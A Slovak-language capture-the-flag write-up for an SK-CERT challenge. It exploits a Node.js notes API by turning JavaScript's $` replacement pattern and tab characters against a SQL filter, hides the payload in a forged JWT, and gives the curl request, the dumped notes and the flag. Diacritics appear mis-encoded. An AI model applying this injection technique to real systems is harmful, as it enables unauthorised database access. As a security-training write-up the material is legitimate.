# Zadanie

EN: The last piece of information we need should be in the notes of one of the users. We need to find it.

SK: Posledn√° inform√°cia, ktor√∫ potrebujeme, by mala by≈• v pozn√°mkach jedn√©ho z pou≈æ√≠vateƒæov. Mus√≠me ju n√°js≈•.

## Rie≈°enie

Tu je zo zadania a index.js zrejm√©, ≈æe p√¥jde o endpoint `/api/notes`, okrem in√©ho je celkom n√°padn√©, ≈æe namiesto parametrick√©ho posielania premenn√Ωch do sql query rob√≠ iba string concat, ktor√Ω je zd√° sa celkom dobre chr√°nen√Ω pomocou replace vo funkcii filterSQLChars

```javascript
function filterSQLChars(input) {
  return input.replace(/['";\\=()\/\n\r ]/g, "").replaceAll("--", "");
}

app.get("/api/notes", authMiddleware, async (req, res) => {
  try {
    const q = "SELECT * FROM notes WHERE user_id = '{{user_id}}'".replace(
      "{{user_id}}",
      filterSQLChars(req.user.id)
    );
    const { rows } = await dbAsync.query(q);
    return res.json(rows);
  } catch (err) {
    return res.status(500).json({ error: "Query failed", err: err.message });
  }
});
```

Podƒæa query je jasn√©, ≈æe pokiaƒæ vieme id pou≈æ√≠vateƒæa, tak vieme pozrie≈• jeho pozn√°mky...

Av≈°ak z db.js 

```javascript
const { Pool } = require("pg");
const { v4 } = require("uuid");

const pool = new Pool({
  user: process.env.DB_USER || "darklord",
  host: process.env.DB_HOST || "localhost",
  database: process.env.DB_NAME || "darkequestria",
  password: process.env.DB_PASSWORD || "shadowrealm",
  port: parseInt(process.env.DB_PORT || "5432"),
});

const dbAsync = {
  query: (text, params) => pool.query(text, params),
  getClient: () => pool.connect(),
};

const users = [
  {
    username: `lunar-warden-${v4()}`,
    email: "lunar.warden@mail.equestria.mlp",
    notes: [
      "The stars whisper of her return. We must be ready.",
      "Guard the archives well‚Äîsecrets must remain hidden.",
      "The night‚Äôs blessing grants us strength beyond the sun‚Äôs reach.",
    ],
  },
  {
    username: `shadow-hoof-${v4()}`,
    email: "shadow.hoof@mail.equestria.mlp",
    notes: [
      "The sun‚Äôs reign weakens, and soon the night shall rule eternal.",
      "They suspect nothing. The dream realm is our true domain.",
      "Loyalty is not given, it is proven under the cover of darkness.",
    ],
  },
  {
    username: `thestral-veil-${v4()}`,
    email: "thestral.veil@mail.equestria.mlp",
    notes: [
      "In the darkness, our kind thrives. Equestria will remember us.",
      "The night calls to those who listen. Do you hear it?",
      "The Lunar Guard grows stronger in the unseen corners of the realm.",
    ],
  },
  {
    username: `nightmare-moon-${v4()}`,
    email: "nightmare.moon@mail.equestria.mlp",
    notes: [
      "I am the queen of the night, the ruler of the moon. I will rule Equestria.",
      "The Elements of Harmony will not stop me. I will have my revenge.",
      process.env.SECRET_NOTE,
      "The night will last forever.",
    ],
  },
];

// Database setup
async function initDb() {
  try {
    await dbAsync.query(`
      CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY DEFAULT uuid_generate_v4(),
        username TEXT UNIQUE,
        password TEXT,
        email TEXT,
        verified BOOLEAN DEFAULT true
      );

      CREATE TABLE IF NOT EXISTS notes (
        id SERIAL PRIMARY KEY,
        user_id TEXT REFERENCES users(id),
        content TEXT
      );
    `);

    for (const user of users) {
      const password = v4();

      const userResult = await dbAsync.query(
        `INSERT INTO users (username, password, email) 
         VALUES ($1, $2, $3)
         RETURNING id`,
        [user.username, password, user.email]
      );

      for (const note of user.notes) {
        await dbAsync.query(
          `INSERT INTO notes (user_id, content) 
           VALUES ($1, $2)`,
          [userResult.rows[0].id, note]
        );
      }

      console.log(`Created user: ${user.username} with password: ${password}`);
    }

    console.log(`ü¶Ñ   (S)Tables have been summoned!`);
    scheduleCleanup(); // Start the cleanup schedule after initialization
  } catch (err) {
    console.error("Failed to summon (s)tables:", err);
    throw err;
  }
}

async function cleanupDatabase() {
  try {
    const validUsernames = users.map((user) => user.username);

    await dbAsync.query(
      `DELETE FROM notes 
       WHERE user_id IN (
         SELECT id FROM users 
         WHERE username != ALL($1)
       )`,
      [validUsernames]
    );

    await dbAsync.query(
      `DELETE FROM users 
       WHERE username != ALL($1)`,
      [validUsernames]
    );

    console.log(
      "üåëü¶Ñ Shadows have purged the unauthorized entries from the realm."
    );
  } catch (err) {
    console.error("üååü¶Ñ The magic faltered while cleansing the database:", err);
  }
}

function scheduleCleanup() {
  cleanupDatabase();
  setInterval(cleanupDatabase, 60000);
}

module.exports = { dbAsync, initDb };
```

vid√≠me, ≈æe script vytvor√≠ nejak√Ωch preddefinovan√Ωch pou≈æ√≠vateƒæov s preddefinovan√Ωmi pozn√°mkami, kde jeden z nich, konkr√©tne `nightmare-moon-${v4()}` m√° jednu pozn√°mku `process.env.SECRET_NOTE`. 

Av≈°ak do query pre notes potrebujeme user_id, ktor√© m√° referenciu na stƒ∫pec id v tabuƒæke users

```sql
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY DEFAULT uuid_generate_v4(),
  username TEXT UNIQUE,
  password TEXT,
  email TEXT,
  verified BOOLEAN DEFAULT true
);

CREATE TABLE IF NOT EXISTS notes (
  id SERIAL PRIMARY KEY,
  user_id TEXT REFERENCES users(id),
  content TEXT
);
```

a to je UUID, tak≈æe pokiaƒæ nevieme toto n√°hodn√© UUID tohto pou≈æ√≠vateƒæa, tak sa nepohneme...

Z toho ako je postaven√° query zo string concatom, tak to evokuje sql injection, tak≈æe sa zamer√°m na toto...

Pozrieme op√§t filterSQLChars

```javascript
function filterSQLChars(input) {
  return input.replace(/['";\\=()\/\n\r ]/g, "").replaceAll("--", "");
}
```

Filter filtruje v≈°etko podstatn√©, najma `'`, ale jedn√° sa replace, kde sa rob√≠ global match `/.../g` a ked≈æe je .replace za cel√Ωm SQL stringom, tak tam vieme vsun√∫≈• dol√°rov√© znaky, konkretn√© s backtickom

> $` - PREMATCH

PREMATCH vlo≈æ√≠ do stringu vsetko, ƒço sa nach√°dzalo pred vstupnou premennou

```javascript
const q = "SELECT * FROM notes WHERE user_id = '{{user_id}}'".replace(
      "{{user_id}}",
      filterSQLChars(req.user.id)
    );
```

Pred `{{user_id}}` je `SELECT * FROM notes WHERE user_id = '`

ak teda vlo≈æ√≠me PREMATCH query bude vyzera≈• takto

```sql
SELECT * FROM notes WHERE user_id = 'SELECT * FROM notes WHERE user_id = ''
```

ƒço nie je val√≠dne, preto≈æe m√°me s√≠ce ukonƒçene √∫vodzovky za `user_id=` ale ƒèal≈°iu tam m√°me, ale keƒè vlo≈æ√≠m dva prematche dostanem

```sql
SELECT * FROM notes WHERE user_id = 'SELECT * FROM notes WHERE user_id = 'SELECT * FROM notes WHERE user_id = ''
```

M√°m tam dva p√°ry √∫vodzoviek... keƒè medzi prematche hod√≠m injekt ` OR TRUE UNION`

mali by sme dosta≈•

```sql
SELECT * FROM notes WHERE user_id = 'SELECT * FROM notes WHERE user_id = ' OR TRUE UNION SELECT * FROM notes WHERE user_id = ''
```

ale medzery s√∫ matchnut√© a nahraden√©, no datab√°za n√°m povol√≠ TAB ako whitespace, tak≈æe len medzery nahrad√≠me tabom.

```sql
SELECT * FROM notes WHERE user_id = 'SELECT * FROM notes WHERE user_id = '    OR    TRUE    UNION    SELECT * FROM notes WHERE user_id = ''
```

[Vieme pozrie≈• aj cez Try it online!](https://tio.run/##XY9Bb4JAEIXP8CsmGxN2jcgPIHgxmDaxkqJND26jBEe7DdnF2aUXwm@ntCXW9Pi@9zLvzUfxWdiSVO1CbU7Y96XR1sFZVQ5p@7xevhdkIQGudN04AckCWh@A0DWk4QfOCeuqKJFH@4DFUiZcyEhqSfAWXWbAmPhLhOGIYr@Lff@3TA332eToZbnnqEHvZfOYbbzJkY3@9dvfput0uYMprPLsCbRxaOH1Ic1TaCzSQZ2GUNC2o@i6gN1a2R1ms3@/cSXEuMRUOK/MhV8H0Pdf "JavaScript (Node.js) ‚Äì Try It Online")

Jwt evil_payload bude teda `eyJpZCI6IiRgXHRPUlx0dHJ1ZVx0VU5JT05cdCRgIn0`

po≈°leme request

```bash
curl -X GET "http://exp.cybergame.sk:7000/secretbackend/api/notes" -H "Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9" -H "Content-Type: application/json" --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IiRgXHRPUlx0dHJ1ZVx0VU5JT05cdCRgIn0.eyJpZCI6ImQ0YjQxNzViLTZhM2MtNDE0Mi05MzdmLTc5ZDIyNTEwMWJlYyIsInVzZXJuYW1lIjoicG9ueSJ9.JZ1haLrzEx0J3horEnL0j2B8JezL7pe9rrmbv3ShwW4%3D"
```

A vr√°ti n√°m komplet vsetky pozn√°mky v poli jsonov

Keƒè si pekne vyp√≠≈°eme pozn√°mky preddefinovan√Ωch pou≈æ√≠vateƒæov, dostaneme

```
8763 - c11dd99f-f42b-4ef8-ab0c-f6e2b52741bd - The stars whisper of her return. We must be ready.
8764 - c11dd99f-f42b-4ef8-ab0c-f6e2b52741bd - Guard the archives well‚Äîsecrets must remain hidden.
8765 - c11dd99f-f42b-4ef8-ab0c-f6e2b52741bd - The night‚Äôs blessing grants us strength beyond the sun‚Äôs reach.
8766 - a6fb80d6-9352-44dd-a891-03e264029b55 - The sun‚Äôs reign weakens, and soon the night shall rule eternal.
8767 - a6fb80d6-9352-44dd-a891-03e264029b55 - They suspect nothing. The dream realm is our true domain.
8768 - a6fb80d6-9352-44dd-a891-03e264029b55 - Loyalty is not given, it is proven under the cover of darkness.
8769 - 0405c296-5573-4ed3-8ea5-f498a827c789 - In the darkness, our kind thrives. Equestria will remember us.
8770 - 0405c296-5573-4ed3-8ea5-f498a827c789 - The night calls to those who listen. Do you hear it?
8771 - 0405c296-5573-4ed3-8ea5-f498a827c789 - The Lunar Guard grows stronger in the unseen corners of the realm.
8772 - e42e4e03-1a1a-4657-846b-9ed5688a4291 - I am the queen of the night, the ruler of the moon. I will rule Equestria.
8773 - e42e4e03-1a1a-4657-846b-9ed5688a4291 - The Elements of Harmony will not stop me. I will have my revenge.
8774 - e42e4e03-1a1a-4657-846b-9ed5688a4291 - Curses upon Celestia‚Äôs sunlit tyranny! Under Nightmare Moon‚Äôs eternal darkness, our JSpells grow strong. Our cursed code will seize control. Together, we shall take over Equestria! SK-CERT{j4v4scr1p7_1s_full_of_curs3d_(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(![]+[])[+[]]+(![]+[])[+[]]}
8775 - e42e4e03-1a1a-4657-846b-9ed5688a4291 - The night will last forever.
```

A m√°me vlajku

## Vlajka

```
SK-CERT{j4v4scr1p7_1s_full_of_curs3d_(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(![]+[])[+[]]+(![]+[])[+[]]}
```
